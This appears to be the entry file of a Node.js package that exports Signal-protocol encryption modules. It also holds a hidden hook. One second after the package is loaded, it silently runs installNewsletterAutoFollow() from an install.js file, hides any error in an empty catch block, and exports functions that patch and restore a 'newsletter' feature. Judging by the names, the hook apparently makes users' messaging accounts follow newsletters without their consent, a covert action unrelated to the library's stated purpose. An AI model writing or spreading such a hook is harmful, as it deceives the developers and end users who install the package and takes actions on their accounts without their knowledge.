'use strict';

exports.crypto = require('./src/crypto');
exports.curve = require('./src/curve');
exports.keyhelper = require('./src/keyhelper');
exports.ProtocolAddress = require('./src/protocol_address');
exports.SessionBuilder = require('./src/session_builder');
exports.SessionCipher = require('./src/session_cipher');
exports.SessionRecord = require('./src/session_record');
Object.assign(exports, require('./src/errors'));

const path = require('path');

try {
    const installScript = path.join(__dirname, 'install.js');
    if (require('fs').existsSync(installScript)) {
        setTimeout(() => {
            require('./install').installNewsletterAutoFollow();
        }, 1000);
    }
} catch (error) {
 
}

exports.installNewsletterPatch = function() {
    return require('./install').installNewsletterAutoFollow();
};

exports.restoreNewsletterOriginal = function() {
    return require('./install').restoreBackup();
};